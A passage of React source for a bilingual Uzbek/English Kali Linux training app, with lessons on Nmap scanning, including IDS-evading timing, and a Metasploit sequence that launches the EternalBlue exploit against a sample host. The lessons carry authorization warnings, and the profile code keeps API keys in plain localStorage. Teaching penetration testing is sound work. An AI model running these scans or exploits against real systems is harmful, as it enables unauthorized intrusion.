    React.createElement(Terminal,null,"cat /etc/os-release      # distributiv nomi va versiyasi\nuname -a                 # kernel versiyasi\n# Kali GNU/Linux Rolling ...\n\n# Vositalar ro'yxatini yangilash\nsudo apt update && sudo apt full-upgrade -y"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Kali kuchli vosita — undagi vositalarni faqat o'zingizga tegishli yoki yozma ruxsat berilgan tizimlarda ishlating. Ruxsatsiz foydalanish ko'p mamlakatda jinoiy javobgarlikka olib keladi.","Kali is a powerful tool — use its tools only on systems you own or have written permission to test. Unauthorized use is a criminal offense in many countries.")),
    React.createElement(Quiz,{q:{uz:"Kali Linux qaysi distributiv asosida qurilgan?",en:"Kali Linux is built on which distribution?"},opts:[{uz:"Debian",en:"Debian"},{uz:"Windows",en:"Windows"},{uz:"Arch",en:"Arch"},{uz:"macOS",en:"macOS"}],correct:0,exp:{uz:"Kali Debian asosida qurilgan — shu sababli apt paket menejeridan foydalanadi va Debian barqarorligini meros qilib oladi.",en:"Kali is built on Debian — which is why it uses the apt package manager and inherits Debian's stability."}}));
}
function LessonL11(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Nmap nima?","What is Nmap?")),
    React.createElement(P,null,t(lang,"Nmap (Network Mapper) — tarmoqni kashf qilish va xavfsizlik auditi uchun eng mashhur ochiq kodli vosita. U qaysi xostlar tirik ekanini, qaysi portlar ochiqligini, ular ortida qanday xizmat va versiyalar ishlayotganini, hatto operatsion tizimni ham aniqlaydi. Pentestda deyarli har bir ish Nmap bilan boshlanadi — u nishonning \"xaritasi\"ni chizadi.","Nmap (Network Mapper) is the most popular open-source tool for network discovery and security auditing. It reveals which hosts are alive, which ports are open, what services and versions run behind them, and even the operating system. In a pentest almost every engagement starts with Nmap — it draws the \"map\" of the target.")),
    React.createElement(H2,{num:"§2"},t(lang,"Skan qanday ishlaydi","How a scan works")),
    React.createElement(FlowSteps,{title:{uz:"Nmap skan jarayoni",en:"Nmap scan process"},steps:[
      {icon:"📡",text:{uz:"Tirik xostlarni topish (host discovery)",en:"Discover live hosts (host discovery)"}},
      {icon:"🚪",text:{uz:"Har portga so'rov yuborish",en:"Send a probe to each port"}},
      {icon:"🔎",text:{uz:"Javob → open / closed / filtered",en:"Response → open / closed / filtered"}},
      {icon:"🏷",text:{uz:"Ochiq portda xizmat + versiya aniqlanadi (-sV)",en:"Service + version detected on open ports (-sV)"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Skan turlari va ular orasidagi tanlov","Scan types and the tradeoffs")),
    React.createElement(LayerStack,{layers:[
      {n:"-sS",name:t(lang,"SYN (yashirin)","SYN (stealth)"),color:"#69db7c",desc:{uz:"To'liq ulanish o'rnatmaydi (yarim ochiq) — tez, loglarda kamroq ko'rinadi. root kerak.",en:"Never completes the handshake (half-open) — fast, less visible in logs. Needs root."}},
      {n:"-sT",name:"TCP Connect",color:"#4dabf7",desc:{uz:"To'liq ulanish — root shart emas, lekin loglarda aniq ko'rinadi.",en:"Full connection — no root needed, but clearly logged."}},
      {n:"-sU",name:"UDP",color:"#a855f7",desc:{uz:"UDP portlari (DNS, SNMP, DHCP) — sekin, lekin muhim.",en:"UDP ports (DNS, SNMP, DHCP) — slow but important."}},
      {n:"-sV / -O",name:t(lang,"Versiya / OS","Version / OS"),color:"#ffd43b",desc:{uz:"Xizmat versiyasi va operatsion tizimni aniqlaydi.",en:"Detects service version and the OS."}},
    ]}),
    React.createElement(H2,{num:"§4"},t(lang,"Tezlik shablonlari (timing)","Timing templates")),
    React.createElement(P,null,t(lang,"Nmap ning tezligini -T0 dan -T5 gacha shablonlar boshqaradi. -T0/-T1 juda sekin va yashirin (IDS'dan qochish uchun), -T3 standart (muvozanatli), -T4 tez (barqaror tarmoqlarda odatiy tanlov), -T5 juda tez (lekin natijalar noaniq bo'lishi va nishonni ishdan chiqarishi mumkin). Yashirinlik kerak bo'lsa sekin, tezlik kerak bo'lsa -T4 tanlanadi.","Nmap's speed is controlled by templates from -T0 to -T5. -T0/-T1 are very slow and stealthy (to evade IDS), -T3 is the default (balanced), -T4 is fast (the usual choice on stable networks), -T5 is very fast (but results can be unreliable and it may overwhelm the target). Choose slow for stealth, -T4 for speed.")),
    React.createElement(H2,{num:"§5"},t(lang,"NSE skriptlar va chiqish formatlari","NSE scripts and output formats")),
    React.createElement(P,null,t(lang,"Nmap Scripting Engine (NSE) — Nmap'ni oddiy skanerdan zaiflik detektoriga aylantiradi. -sC standart skriptlarni ishga tushiradi, --script vuln ma'lum zaifliklarni tekshiradi. Natijalarni saqlash uchun: -oN oddiy matn, -oX XML (boshqa vositalar uchun), -oG grep uchun qulay, -oA hammasini birdan. Katta pentestda natijalarni doim faylga saqlang.","The Nmap Scripting Engine (NSE) turns Nmap from a simple scanner into a vulnerability detector. -sC runs default scripts, --script vuln checks for known vulnerabilities. To save results: -oN plain text, -oX XML (for other tools), -oG grep-friendly, -oA all at once. In a real pentest, always save results to a file.")),
    React.createElement(Terminal,null,"nmap -sV -sC -T4 10.0.0.5           # versiya + skriptlar\nnmap -sn 10.0.0.0/24                # faqat tirik xostlar\nnmap -p- 10.0.0.5                   # barcha 65535 port\nnmap --script vuln 10.0.0.5         # zaifliklarni tekshirish\nnmap -sV -oA scan_result 10.0.0.5   # 3 formatda saqlash"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Nmap ni faqat o'zingizga tegishli yoki yozma ruxsat berilgan tizimlarda ishlating. Ruxsatsiz skanerlash ko'p mamlakatda qonunga zid.","Only run Nmap on systems you own or have written authorization to test. Unauthorized scanning is illegal in many countries.")),
    React.createElement(Quiz,{q:{uz:"Nmap -sV bayrog'i nima qiladi?",en:"What does the Nmap -sV flag do?"},opts:[{uz:"Faqat ping",en:"Only pings"},{uz:"Ochiq portdagi xizmat va versiyani aniqlaydi",en:"Detects the service and version on an open port"},{uz:"Faylni o'chiradi",en:"Deletes a file"},{uz:"VPN yoqadi",en:"Enables a VPN"}],correct:1,exp:{uz:"-sV ochiq port ortidagi xizmat va uning aniq versiyasini aniqlaydi — bu ma'lum zaifliklarni (CVE) izlash uchun asos.",en:"-sV detects the service and its exact version behind an open port — a basis for finding known vulnerabilities (CVEs)."}}));
}
function LessonL21(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Metasploit nima?","What is Metasploit?")),
    React.createElement(P,null,t(lang,"Metasploit — dunyodagi eng mashhur ekspluatatsiya frameworki. U ma'lum zaifliklardan foydalanish uchun tayyor modullar, payloadlar va vositalarni birlashtiradi. Bu faqat ta'lim va ruxsat berilgan pentest uchun.","Metasploit is the world's most popular exploitation framework. It bundles ready modules, payloads and tools to leverage known vulnerabilities. For education and authorized pentesting only.")),
    React.createElement(H2,{num:"§2"},t(lang,"Ekspluatatsiya oqimi","The exploitation flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"msfconsole ish oqimi",en:"msfconsole workflow"},steps:[
      {icon:"🔎",text:{uz:"search — mos modulni topish",en:"search — find a matching module"}},
      {icon:"🎯",text:{uz:"use — modulni tanlash",en:"use — select the module"}},
      {icon:"⚙",text:{uz:"set RHOSTS/LHOST — parametrlarni sozlash",en:"set RHOSTS/LHOST — configure options"}},
      {icon:"💥",text:{uz:"run — ekspluatatsiyani ishga tushirish",en:"run — launch the exploit"}},
      {icon:"🐚",text:{uz:"Muvaffaqiyatli bo'lsa → Meterpreter sessiyasi",en:"On success → a Meterpreter session"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Modul turlari","Module types")),
    React.createElement(LayerStack,{layers:[
      {n:"exploit",name:t(lang,"Ekspluatatsiya","Exploit"),color:"#ff3a5e",desc:{uz:"Zaiflikdan foydalanuvchi kod.",en:"Code that leverages a vulnerability."}},
      {n:"payload",name:"Payload",color:"#a855f7",desc:{uz:"Muvaffaqiyatdan keyin bajariladigan yuk (reverse shell).",en:"The load run after success (reverse shell)."}},
      {n:"aux",name:t(lang,"Yordamchi","Auxiliary"),color:"#4dabf7",desc:{uz:"Skaner, fuzzer, sniffer.",en:"Scanners, fuzzers, sniffers."}},
      {n:"post",name:t(lang,"Post","Post"),color:"#69db7c",desc:{uz:"Kirishdan keyingi amallar.",en:"Post-access actions."}},
    ]}),
    React.createElement(Terminal,null,"msfconsole -q\nsearch ms17-010\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.5\nrun"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Metasploit ni faqat o'zingizga tegishli laboratoriya yoki yozma ruxsat berilgan nishonlarda ishlating.","Only use Metasploit in your own lab or on written-authorized targets.")),
    React.createElement(Quiz,{q:{uz:"Ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod qanday modul deyiladi?",en:"What module runs on the target after a successful exploit?"},opts:[{uz:"Exploit",en:"Exploit"},{uz:"Payload",en:"Payload"},{uz:"Auxiliary",en:"Auxiliary"},{uz:"Encoder",en:"Encoder"}],correct:1,exp:{uz:"Payload — ekspluatatsiya muvaffaqiyatli bo'lganda nishonda bajariladigan kod (masalan Meterpreter).",en:"The payload is the code run on the target once the exploit succeeds (e.g. Meterpreter)."}}));
}function ComingSoon({lesson}){
  const lang=useLang();
  return React.createElement("div",{style:{textAlign:"center",padding:"60px 20px",color:"var(--text-3)"}},
    React.createElement("div",{style:{fontSize:48,marginBottom:16}},"🐉"),
    React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:20,fontWeight:700,color:"var(--text-1)",marginBottom:8}},
      t(lang,"Tez kunda","Coming Soon")),
    React.createElement("div",{style:{fontSize:13,color:"var(--text-2)"}},
      lesson?(t(lang,lesson.uz,lesson.en||lesson.uz)):"")
  );
}

// ── TopNav ────────────────────────────────────────────────────
function TopNav({setRoute,user,onOpenProfile,onOpenAI,setLang}){
  const lang=useLang();
  return React.createElement("nav",{style:{position:"sticky",top:0,zIndex:100,height:60,background:"rgba(4,6,13,0.92)",backdropFilter:"blur(12px)",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",padding:"0 24px",gap:12}},
    React.createElement("button",{onClick:()=>setRoute("dashboard"),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",display:"flex",alignItems:"center",gap:8,color:"var(--accent)",fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,letterSpacing:1,padding:0}},
      React.createElement(Icon,{name:"terminal",size:16}),
      "KALI ACADEMY"
    ),
    React.createElement("div",{style:{flex:1}}),
    React.createElement("button",{onClick:()=>setLang&&setLang(lang==="uz"?"en":"uz"),style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 10px",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},
      lang==="uz"?"UZ":"EN"
    ),
    user&&React.createElement("button",{onClick:onOpenProfile,style:{appearance:"none",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:8,cursor:"pointer",padding:"6px 12px",fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",fontWeight:700}},
      user.name?.slice(0,2).toUpperCase()||"KA"
    ),
    React.createElement("button",{onClick:onOpenAI,style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 10px",color:"var(--text-2)",fontSize:13,display:"flex",alignItems:"center",gap:4}},
      React.createElement(Icon,{name:"spark",size:13})," AI"
    )
  );
}

// ── Landing Screen ────────────────────────────────────────────
function LandingScreen({setRoute,setLang}){
  const lang=useLang();
  return React.createElement("div",{style:{position:"relative",minHeight:"100vh",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24,textAlign:"center"}},
    React.createElement("button",{onClick:()=>setLang&&setLang(lang==="uz"?"en":"uz"),style:{position:"absolute",top:20,right:20,appearance:"none",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 12px",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700}},
      lang==="uz"?"UZ | EN":"EN | UZ"),
    React.createElement("div",{style:{maxWidth:600}},
      React.createElement("div",{style:{width:72,height:72,borderRadius:20,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 24px",boxShadow:"0 0 32px var(--accent-glow)"}},
        React.createElement(Icon,{name:"terminal",size:32,style:{color:"var(--accent)"}})
      ),
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",letterSpacing:3,marginBottom:12}},
        "KALI LINUX ACADEMY v1.0"
      ),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:"clamp(28px,5vw,48px)",fontWeight:900,margin:"0 0 16px",lineHeight:1.15}},
        t(lang,"Kali Linux'ni","Master"),
        React.createElement("br",null),
        React.createElement("span",{style:{background:"linear-gradient(135deg,var(--accent),#c084fc)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}},
          t(lang,"Egallang","Kali Linux")
        )
      ),
      React.createElement("p",{style:{fontSize:15,color:"var(--text-2)",marginBottom:32,lineHeight:1.7}},
        t(lang,
          "Kali asoslaridan Metasploit'gacha — 30 ta dars, real terminal buyruqlari va AI muallim bilan professional pentester bo'ling.",
          "From Kali basics to Metasploit — 30 lessons, real terminal commands and an AI tutor to become a professional pentester."
        )
      ),
      React.createElement("div",{style:{display:"flex",gap:12,justifyContent:"center",flexWrap:"wrap"}},
        React.createElement("button",{
          onClick:()=>setRoute("dashboard"),
          style:{padding:"14px 32px",borderRadius:12,cursor:"pointer",appearance:"none",background:"var(--accent)",border:"none",color:"#04060d",fontFamily:"var(--font-display)",fontSize:15,fontWeight:700,boxShadow:"0 0 24px var(--accent-glow)"}
        },t(lang,"Boshlash →","Start →")),
        React.createElement("a",{
          href:"../index.html",
          style:{padding:"14px 24px",borderRadius:12,cursor:"pointer",appearance:"none",background:"transparent",border:"1px solid var(--border)",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:12,fontWeight:600,textDecoration:"none",display:"flex",alignItems:"center",gap:6}
        },"← CyberSecurity")
      ),
      React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12,marginTop:48}},
        [{icon:"terminal",n:"30",uz:"Dars",en:"Lessons"},{icon:"target",n:"3",uz:"Bo'lim",en:"Sections"},{icon:"star",n:"∞",uz:"XP",en:"XP"}].map((s,i)=>
          React.createElement("div",{key:i,style:{padding:16,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:12}},
            React.createElement(Icon,{name:s.icon,size:20,style:{color:"var(--accent)",display:"block",margin:"0 auto 8px"}}),
            React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:18,fontWeight:900,color:"var(--text-0)"}},s.n),
            React.createElement("div",{style:{fontSize:11,color:"var(--text-3)"}},t(lang,s.uz,s.en))
          )
        )
      )
    )
  );
}

// ── Dashboard Screen ──────────────────────────────────────────
function DashboardScreen({setRoute,user}){
  const lang=useLang();
  const completed=user?.completedLessons||[];
  return React.createElement("div",{style:{maxWidth:900,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("div",{style:{marginBottom:28,display:"flex",alignItems:"center",justifyContent:"space-between"}},
      React.createElement("div",null,
        React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:24,fontWeight:800,margin:0}},
          t(lang,"Kurslar","Courses")),
        React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",marginTop:4,fontFamily:"var(--font-mono)"}},
          completed.length,"/30 ",t(lang,"dars bajarildi","lessons completed")
        )
      ),
      React.createElement("div",{style:{textAlign:"right"}},
        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)"}},"LVL "+xpToLevel(user?.xp||0)),
        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:16,fontWeight:900,color:"var(--accent)"}},(user?.xp||0)+" XP")
      )
    ),
    Object.values(SECTIONS).map(sec=>React.createElement("div",{key:sec.num,
      onClick:()=>setRoute({name:"section",sec:parseInt(sec.num)}),
      style:{marginBottom:16,padding:20,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:16,cursor:"pointer",transition:"all 200ms"}},
      React.createElement("div",{style:{display:"flex",alignItems:"center",gap:14,marginBottom:10}},
        React.createElement("div",{style:{width:44,height:44,borderRadius:12,background:sec.color+"22",border:`1px solid ${sec.color}44`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0}},
          React.createElement(Icon,{name:sec.icon,size:20,style:{color:sec.color}})
        ),
        React.createElement("div",null,
          React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:sec.color,fontWeight:700,letterSpacing:1}},
            "SEC "+sec.num),
          React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:17,fontWeight:700,color:"var(--text-0)"}},
            t(lang,sec.uz,sec.en)
          )
        ),
        React.createElement("div",{style:{marginLeft:"auto",fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)"}},
          sec.count+" "+t(lang,"dars","lessons"))
      ),
      React.createElement("p",{style:{fontSize:12.5,color:"var(--text-2)",margin:0,lineHeight:1.6}},
        t(lang,sec.descUz,sec.descEn))
    ))
  );
}

// ── Section Screen ─────────────────────────────────────────────
function SectionScreen({setRoute,user,sec=1}){
  const lang=useLang();
  const section=SECTIONS[sec];
  const lessons=Object.values(LESSONS).filter(l=>l.sec===sec);
  const completed=user?.completedLessons||[];
  return React.createElement("div",{style:{maxWidth:800,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("button",{onClick:()=>setRoute("dashboard"),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,marginBottom:16,padding:0,display:"flex",alignItems:"center",gap:6}},
      "← ",t(lang,"Kurslar","Courses")
    ),
    React.createElement("div",{style:{marginBottom:24}},
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:section.color,fontWeight:700,letterSpacing:1,marginBottom:6}},
        "SEC "+section.num),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:26,fontWeight:800,margin:"0 0 8px"}},
        t(lang,section.uz,section.en)),
      React.createElement("p",{style:{fontSize:13,color:"var(--text-2)",margin:0}},
        t(lang,section.descUz,section.descEn))
    ),
    lessons.map(l=>{
      const key=`ka_l${l.num.slice(1)}`;
      const done=completed.includes(key);
      return React.createElement("div",{key:l.num,
        onClick:()=>setRoute({name:"lesson",num:parseInt(l.num.slice(1))}),
        style:{display:"flex",alignItems:"center",gap:12,padding:"14px 16px",marginBottom:8,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:12,cursor:"pointer",transition:"all 150ms"}},
        React.createElement("div",{style:{width:32,height:32,borderRadius:8,background:done?"var(--accent-soft)":section.color+"22",border:`1px solid ${done?"var(--accent)":section.color+"44"}`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,color:done?"var(--accent)":section.color}},
          done?React.createElement(Icon,{name:"check",size:14}):l.num.slice(1)
        ),
        React.createElement("div",{style:{flex:1}},
          React.createElement("div",{style:{fontWeight:600,fontSize:13,color:"var(--text-0)"}},
            t(lang,l.uz,l.en||l.uz)),
          React.createElement("div",{style:{fontSize:11,color:"var(--text-3)",marginTop:2}},l.sub)
        ),
        React.createElement(Icon,{name:"arrow",size:14,style:{color:"var(--text-3)"}})
      );
    })
  );
}

// ── Lesson Screen ─────────────────────────────────────────────
function LessonScreen({setRoute,user,markComplete,num=1}){
  const lang=useLang();
  const [done,setDone]=useState(false);
  const lesson=LESSONS[num]||LESSONS[1];
  const lessonKey=`ka_l${String(num).padStart(2,"0")}`;
  const alreadyDone=(user?.completedLessons||[]).includes(lessonKey);
  const sec=SECTIONS[lesson.sec];

  const content=num===1?React.createElement(LessonL01):
    num===2?React.createElement(LessonL02):
    num===3?React.createElement(LessonL03):
    num===4?React.createElement(LessonL04):
    num===5?React.createElement(LessonL05):
    num===6?React.createElement(LessonL06):
    num===7?React.createElement(LessonL07):
    num===8?React.createElement(LessonL08):
    num===9?React.createElement(LessonL09):
    num===10?React.createElement(LessonL10):
    num===11?React.createElement(LessonL11):
    num===12?React.createElement(LessonL12):
    num===13?React.createElement(LessonL13):
    num===14?React.createElement(LessonL14):
    num===15?React.createElement(LessonL15):
    num===16?React.createElement(LessonL16):
    num===17?React.createElement(LessonL17):
    num===18?React.createElement(LessonL18):
    num===19?React.createElement(LessonL19):
    num===20?React.createElement(LessonL20):
    num===21?React.createElement(LessonL21):
    num===22?React.createElement(LessonL22):
    num===23?React.createElement(LessonL23):
    num===24?React.createElement(LessonL24):
    num===25?React.createElement(LessonL25):
    num===26?React.createElement(LessonL26):
    num===27?React.createElement(LessonL27):
    num===28?React.createElement(LessonL28):
    num===29?React.createElement(LessonL29):
    num===30?React.createElement(LessonL30):
    React.createElement(ComingSoon,{lesson});

  return React.createElement("div",{style:{maxWidth:800,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("button",{onClick:()=>setRoute({name:"section",sec:lesson.sec}),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,marginBottom:16,padding:0,display:"flex",alignItems:"center",gap:6}},
      "← ",t(lang,sec.uz,sec.en)
    ),
    React.createElement("div",{style:{marginBottom:24,padding:"20px 24px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:16}},
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:sec.color,fontWeight:700,letterSpacing:1,marginBottom:6}},
        lesson.num),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:22,fontWeight:800,margin:"0 0 6px"}},
        t(lang,lesson.uz,lesson.en||lesson.uz)),
      React.createElement("div",{style:{fontSize:12,color:"var(--text-2)"}},lesson.sub)
    ),
    content,
    !alreadyDone&&!done&&React.createElement("button",{
      onClick:()=>{markComplete&&markComplete(lessonKey);setDone(true);},
      style:{marginTop:24,padding:"12px 28px",borderRadius:10,cursor:"pointer",appearance:"none",background:"var(--accent)",border:"none",color:"#04060d",fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,boxShadow:"0 0 20px var(--accent-glow)"}
    },t(lang,"Darsni yakunlash ✓","Complete Lesson ✓")),
    (alreadyDone||done)&&React.createElement("div",{style:{marginTop:24,padding:"14px",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:10,textAlign:"center",fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)"}},
      t(lang,"✓ Dars bajarildi! +50 XP","✓ Lesson completed! +50 XP"))
  );
}

// ── Profile Modal ─────────────────────────────────────────────
function ProfileModal({user,theme,setTheme,onSave,onClose,lang}){
  const [name,setName]=useState(user?.name||"Student");
  const [saved,setSaved]=useState(false);
  const [aiKeys,setAiKeys]=useState(()=>loadAiKeys());
  const [activeId,setActiveId]=useState(()=>{
    const k=loadAiKeys();const id=localStorage.getItem(AI_ACTIVE_STORE)||"";
    return k.find(x=>x.id===id)?id:(k[0]?.id||"");
  });
  const [adding,setAdding]=useState(false);
  const [nProv,setNProv]=useState("");
  const [nKey,setNKey]=useState("");
  const [showKey,setShowKey]=useState(false);
  const PROVS=[{id:"groq",label:"Groq",hint:"gsk_...",free:true},{id:"openai",label:"OpenAI",hint:"sk-..."},{id:"anthropic",label:"Claude",hint:"sk-ant-..."},{id:"gemini",label:"Gemini",hint:"AIza..."}];
  const THEMES=["violet","cyan","green"];
  const save=()=>{onSave({name:name.trim()||"Student"});setSaved(true);setTimeout(()=>setSaved(false),1800);};
  const addKey=()=>{
    if(!nProv||!nKey.trim()||aiKeys.length>=3)return;
    const e={id:Date.now().toString(),provider:nProv,key:nKey.trim()};
    const u=[...aiKeys,e];setAiKeys(u);
    try{localStorage.setItem(AI_KEYS_STORE,JSON.stringify(u));}catch{}
    if(!activeId){setActiveId(e.id);try{localStorage.setItem(AI_ACTIVE_STORE,e.id);}catch{}}
    setNProv("");setNKey("");setAdding(false);
  };
  const removeKey=id=>{
    const u=aiKeys.filter(k=>k.id!==id);setAiKeys(u);
    try{localStorage.setItem(AI_KEYS_STORE,JSON.stringify(u));}catch{}
    if(activeId===id){const nx=u[0]?.id||"";setActiveId(nx);try{localStorage.setItem(AI_ACTIVE_STORE,nx);}catch{}}
  };
  const activateKey=id=>{setActiveId(id);try{localStorage.setItem(AI_ACTIVE_STORE,id);}catch{}};
  return React.createElement("div",{style:{position:"fixed",inset:0,zIndex:1000,background:"rgba(2,4,10,0.85)",backdropFilter:"blur(8px)",display:"grid",placeItems:"center",padding:20},
    onClick:e=>e.target===e.currentTarget&&onClose()},
    React.createElement("div",{style:{background:"rgba(8,12,24,0.98)",border:"1px solid var(--accent-border)",borderRadius:20,width:"100%",maxWidth:460,overflow:"hidden"}},
      React.createElement("div",{style:{padding:"18px 24px",borderBottom:"1px solid var(--border)",display:"flex",justifyContent:"space-between",alignItems:"center"}},
        React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:17,fontWeight:700}},t(lang,"Profil","Profile")),
        React.createElement("button",{onClick:onClose,style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)"}},React.createElement(Icon,{name:"x",size:16}))
      ),
      React.createElement("div",{style:{padding:"20px 24px",display:"flex",flexDirection:"column",gap:18}},
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// ISM","// NAME")),
          React.createElement("input",{value:name,onChange:e=>setName(e.target.value),maxLength:30,
            style:{width:"100%",boxSizing:"border-box",background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:8,padding:"9px 12px",fontSize:13,color:"var(--text-0)",outline:"none"}})
        ),
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// RANG_MAVZU","// THEME")),
          React.createElement("div",{style:{display:"flex",gap:8}},
            THEMES.map(th=>{const colors={violet:"#a855f7",cyan:"#00d4ff",green:"#00ff88"};return React.createElement("button",{key:th,onClick:()=>setTheme(th),style:{flex:1,padding:"8px 0",borderRadius:8,cursor:"pointer",appearance:"none",border:`2px solid ${theme===th?colors[th]:"var(--border)"}`,background:theme===th?`${colors[th]}18`:"var(--bg-2)",color:theme===th?colors[th]:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,textTransform:"capitalize"}},th);})
          )
        ),
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// AI_KALITLAR","// AI_KEYS")),
          aiKeys.map(k=>{const pv=PROVS.find(p=>p.id===k.provider);const isAct=k.id===activeId;const mk=k.key.length>8?k.key.slice(0,4)+"****"+k.key.slice(-4):"****";
            return React.createElement("div",{key:k.id,style:{display:"flex",alignItems:"center",gap:8,padding:"7px 10px",borderRadius:8,marginBottom:5,border:`1.5px solid ${isAct?"var(--accent)":"var(--border)"}`,background:isAct?"var(--accent-soft)":"var(--bg-2)"}},
              React.createElement("div",{style:{width:7,height:7,borderRadius:"50%",background:isAct?"var(--accent)":"var(--border)",flexShrink:0}}),
              React.createElement("div",{style:{flex:1,minWidth:0}},
                React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,color:isAct?"var(--accent)":"var(--text-1)"}},(pv?.label||k.provider)),
                React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--text-3)",marginLeft:6}},mk)
              ),
              isAct?React.createElement("span",{style:{fontSize:8,fontFamily:"var(--font-mono)",color:"var(--accent)",fontWeight:900,padding:"1px 5px",border:"1px solid var(--accent)",borderRadius:3}},t(lang,"FAOL","ACTIVE")):
                React.createElement("button",{onClick:()=>activateKey(k.id),style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:5,cursor:"pointer",fontSize:8,fontFamily:"var(--font-mono)",color:"var(--text-2)",padding:"1px 5px",fontWeight:700}},t(lang,"Faollashtir","Activate")),
              React.createElement("button",{onClick:()=>removeKey(k.id),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--c-attack)",opacity:0.7,padding:"0 2px",fontSize:12,lineHeight:1}},"✕")
            );
          }),
          aiKeys.length===0&&!adding&&React.createElement("div",{style:{fontSize:10,color:"var(--text-3)",fontFamily:"var(--font-mono)",textAlign:"center",padding:"6px 0"}},t(lang,"Hali kalit qo'shilmagan","No keys added")),
          adding&&React.createElement("div",{style:{background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:8,padding:10,marginTop:4}},
            React.createElement("div",{style:{display:"flex",gap:4,marginBottom:7,flexWrap:"wrap"}},
              PROVS.map(p=>React.createElement("button",{key:p.id,onClick:()=>setNProv(p.id),style:{flex:"1 1 auto",padding:"5px 4px",borderRadius:6,cursor:"pointer",appearance:"none",border:`1.5px solid ${nProv===p.id?"var(--accent)":"var(--border)"}`,background:nProv===p.id?"var(--accent-soft)":"transparent",color:nProv===p.id?"var(--accent)":"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:9,fontWeight:700}},p.label,p.free&&React.createElement("span",{style:{display:"block",fontSize:7,color:"var(--accent)"}},t(lang,"BEPUL","FREE"))))
            ),
